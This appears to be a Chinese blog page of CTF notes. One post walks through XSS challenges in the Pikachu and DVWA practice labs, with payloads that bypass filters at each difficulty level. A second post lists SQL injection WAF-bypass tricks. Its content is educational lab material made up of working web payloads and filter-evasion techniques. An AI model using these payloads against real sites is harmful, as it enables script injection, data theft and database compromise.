<h2 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h2><p>没啥区别，用admin/123456登录进去，在输入框输入xss语句即可</p>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>还是一样的</p>
<h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>进入源码，关键段为</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">&quot;text&quot;</span>).value;</span><br><span class="line">	<span class="built_in">document</span>.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line"><span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;!--<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>--&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;click me!&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;domxss()&quot;</span> /&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>因此本题考察onclick时，怎么调用javascript</p>
<p>payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure>
<h2 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h2><p>代码中有提示，注意闭合语句即可</p>
<p>payload1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&gt;&lt;img src&#x3D;&quot;#&quot; onmouseover&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>payload2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>
<h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>由于输入的表单过去后，直接呈现在页面的<td>标签中，而<td>标签中可以执行javascript，因此直接输入以下语句即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;alert(1)&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
<h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><p>测试哪些字符被转码，输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&quot;&lt;&gt;6666   </span><br></pre></td></tr></table></figure>
<p>查看源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p class&#x3D;&#39;notice&#39;&gt;你的输入已经被记录:&lt;&#x2F;p&gt;&lt;a href&#x3D;&#39;&#39;&quot;&lt;&gt;6666&#39;&gt;&#39;&quot;&lt;&gt;6666&lt;&#x2F;a&gt;            &lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<p>故单引号可以输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;&#39;alert(1)&#39;</span><br></pre></td></tr></table></figure>
<h3 id="XSS的fuzz字典（针对htmlspecialchars）"><a href="#XSS的fuzz字典（针对htmlspecialchars）" class="headerlink" title="XSS的fuzz字典（针对htmlspecialchars）"></a>XSS的fuzz字典（针对htmlspecialchars）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&quot;&lt;&gt;()6666   </span><br></pre></td></tr></table></figure>
<h2 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure>
<h2 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h2><p>输入james，可以看到返回的源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $ms&#x3D;&#39;james&#39;;</span><br><span class="line">	echo $ms;</span><br><span class="line">    if($ms.length !&#x3D; 0)&#123;</span><br><span class="line">        if($ms &#x3D;&#x3D; &#39;tmac&#39;)&#123;</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;tmac确实厉害,看那小眼神..&#39;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">&#x2F;&#x2F;            alert($ms);</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;无论如何不要放弃心中所爱..&#39;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在中间插入js代码的方式</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure>
<p>代码为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $ms&#x3D;&#39;&#39;&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;script&gt;&#39;;</span><br><span class="line">	echo $ms;</span><br><span class="line">    if($ms.length !&#x3D; 0)&#123;</span><br><span class="line">        if($ms &#x3D;&#x3D; &#39;tmac&#39;)&#123;</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;tmac确实厉害,看那小眼神..&#39;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">&#x2F;&#x2F;            alert($ms);</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;无论如何不要放弃心中所爱..&#39;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h1 id="DWVA"><a href="#DWVA" class="headerlink" title="DWVA"></a>DWVA</h1><h2 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS(DOM)"></a>XSS(DOM)</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>在URL处进行注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="median"><a href="#median" class="headerlink" title="median"></a>median</h3><p>选择English，查看返回源码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">if</span> (<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span></span><br><span class="line"><span class="javascript">			<span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="handlebars"><span class="xml">			document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">disabled</span>=<span class="string">&#x27;disabled&#x27;</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line">		&#125;</span><br><span class="line">		    </span><br><span class="line"><span class="handlebars"><span class="xml">		document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;English&#x27;</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">		document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;French&#x27;</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">		document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;Spanish&#x27;</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">		document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;German&#x27;</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>闭合<option>和<select></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;option&gt;&lt;&#x2F;select&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;</span><br></pre></td></tr></table></figure>
<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">English#&lt;&#x2F;option&gt;&lt;&#x2F;select&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;</span><br></pre></td></tr></table></figure>


<h2 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS(Reflected)"></a>XSS(Reflected)</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="median-1"><a href="#median-1" class="headerlink" title="median"></a>median</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert(1)&lt;&#x2F;Script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p>查看源码，对script进行了过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</span><br></pre></td></tr></table></figure>
<p>尝试编码绕过，失败</p>
<p>尝试onclick触发，成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&quot; onclick&#x3D;&quot;alert(1)&quot;&gt;123&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
<p>其他方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS(Stored)"></a>XSS(Stored)</h2><h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Name:</span><br><span class="line">	1234</span><br><span class="line">Message:</span><br><span class="line">	&lt;a href&#x3D;&#39;&#39; onclick&#x3D;&#39;alert(1)&#39;&gt;123&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
<h3 id="median-2"><a href="#median-2" class="headerlink" title="median"></a>median</h3><p>尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Name:</span><br><span class="line">	123</span><br><span class="line">Message:</span><br><span class="line">	&#39;&quot;&lt;&gt;()script</span><br><span class="line">	</span><br><span class="line">返回</span><br><span class="line">Message:\&#39;\&quot;()script</span><br></pre></td></tr></table></figure>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line"><span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize name input</span></span><br><span class="line"><span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line"><span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>strip_tags()会去除字符串中的HTML、XML、PHP标签</p>
<p>addslashes()返回预定义字符前，添加反斜杠</p>
<p>故只能在Name处注入</p>
<p>使用burp改包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txtName&#x3D;&lt;sc&lt;script&gt;ript&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;&amp;mtxMessage&#x3D;3&amp;btnSign&#x3D;Sign+Guestbook</span><br></pre></td></tr></table></figure>
<p>注意不能用hackbar改，会有编码的问题</p>
<h3 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h3><p>看源码，过滤了script，故使用href</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txtName&#x3D;&lt;a href&#x3D;&quot;&quot; onclick&#x3D;&quot;alert(1)&quot;&gt;123&lt;&#x2F;a&gt;&amp;mtxMessage&#x3D;2&amp;btnSign&#x3D;Sign+Guestbook</span><br></pre></td></tr></table></figure>


<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 输入任意字符，如6666</span><br><span class="line">2. 提交后得到返回页面，查看6666所在的位置</span><br><span class="line">3. 通过闭合&#39;&quot;&lt;&gt;，xss注入</span><br><span class="line">	3.1 若有specialchars，需要进行fuzz测试</span><br></pre></td></tr></table></figure>
<h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;javascript&gt;alert(1)&lt;&#x2F;javascript&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;xxx&lt;&#x2F;a&gt;</span><br><span class="line">&lt;Script&gt;alert(1)&lt;&#x2F;Script&gt;</span><br><span class="line">java&amp;#115;cript:alert(1)</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;</span><br><span class="line">#&lt;img src&#x3D;1 onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;</span><br></pre></td></tr></table></figure>


<p>草稿</p>
<p>资源收集</p>
<p>CTFer从0到1</p>
<p>flappypig CTF特训营</p>
<p>windows程序设计</p>
<p>windows核心编程</p>
<p>逆向工程核心原理</p>
<p>逆向工程核心原理</p>
<p>​    恶意代码分析实战</p>
<p>​    使用ollydbg从零开始cracking（过老）</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/01/CTF-Web-XSS/" data-id="ckklyhztb00002gusfdjk0p78" data-title="CTF-Web-XSS" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-Web-SQL注入WAF绕过姿势" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/25/CTF-Web-SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" class="article-date">
  <time class="dt-published" datetime="2021-01-25T07:21:00.000Z" itemprop="datePublished">2021-01-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/25/CTF-Web-SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">SQL注入WAF绕过姿势</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>来源：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/qingwuyou/p/10687462.html">https://www.cnblogs.com/qingwuyou/p/10687462.html</a></p>
<h1 id="（1）大小写绕过"><a href="#（1）大小写绕过" class="headerlink" title="（1）大小写绕过"></a>（1）大小写绕过</h1><p>此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。 </p>
<h1 id="（2）替换关键字"><a href="#（2）替换关键字" class="headerlink" title="（2）替换关键字"></a>（2）替换关键字</h1><p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xx.com&#x2F;index.php?page_id&#x3D;-15 UNIunionON SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure>
<h1 id="（3）空格绕过"><a href="#（3）空格绕过" class="headerlink" title="（3）空格绕过"></a>（3）空格绕过</h1><p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select&#x2F;&#x2F;*&#x2F;&#x2F;from&#x2F;**&#x2F;yz;</span><br><span class="line"></span><br><span class="line">select%0a*%0afrom%0ayz; %0a 是回车</span><br><span class="line"></span><br><span class="line">&#x2F;!select&#x2F;&#x2F;!**&#x2F;&#x2F;!from&#x2F;&#x2F;!yz*&#x2F;;</span><br><span class="line"></span><br><span class="line">select(a)from(yz);</span><br><span class="line"></span><br><span class="line">select(a)from(yz)where(a&#x3D;1);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="（4）替换关键字"><a href="#（4）替换关键字" class="headerlink" title="（4）替换关键字"></a>（4）替换关键字</h1><p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure>


<h1 id="（5）URL编码"><a href="#（5）URL编码" class="headerlink" title="（5）URL编码"></a>（5）URL编码</h1><p>有时后台界面会再次URL解码所以这时可以利用二次编码解决问题<br>后台语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">insert&#x3D;link-&gt;query(urldecode($_GET[&#39;id&#39;]));</span><br><span class="line"></span><br><span class="line">row&#x3D;insert-&gt;fetch_row();</span><br><span class="line"></span><br><span class="line">select * from yz</span><br><span class="line"></span><br><span class="line">select * from %2579%257a</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="（6）十六进制绕过（引号绕过）"><a href="#（6）十六进制绕过（引号绕过）" class="headerlink" title="（6）十六进制绕过（引号绕过）"></a>（6）十六进制绕过（引号绕过）</h1><p>在SQL语句的数据区域可以采用十六进制绕过敏感词汇</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select a from yz where b&#x3D;0x32;</span><br><span class="line"></span><br><span class="line">select * from yz where b&#x3D;char(0x32);</span><br><span class="line"></span><br><span class="line">select * from yz where b&#x3D;char(0x67)+char(0x75)+char(0x65)+char(0x73)+char(0x74)</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.tables where table_name&#x3D;&quot;users&quot;</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.tables where table_name&#x3D;0x7573657273</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<h1 id="（7）逗号绕过"><a href="#（7）逗号绕过" class="headerlink" title="（7）逗号绕过"></a>（7）逗号绕过</h1><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">substr(),mid()</span><br><span class="line"></span><br><span class="line">mid(user() from 1 for 1)</span><br><span class="line"></span><br><span class="line">substr(user() from 1 for 1)</span><br><span class="line"></span><br><span class="line">select substr(user()from -1) from yz ;</span><br><span class="line"></span><br><span class="line">select ascii(substr(user() from 1 for 1)) &lt; 150;</span><br></pre></td></tr></table></figure>
<p>同时也可以利用替换函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select left(database(),2)&gt;&#39;tf&#39;;</span><br><span class="line"></span><br><span class="line">selete * from testtable limit 2,1;</span><br><span class="line"></span><br><span class="line">selete * from testtable limit 2 offset 1;</span><br></pre></td></tr></table></figure>
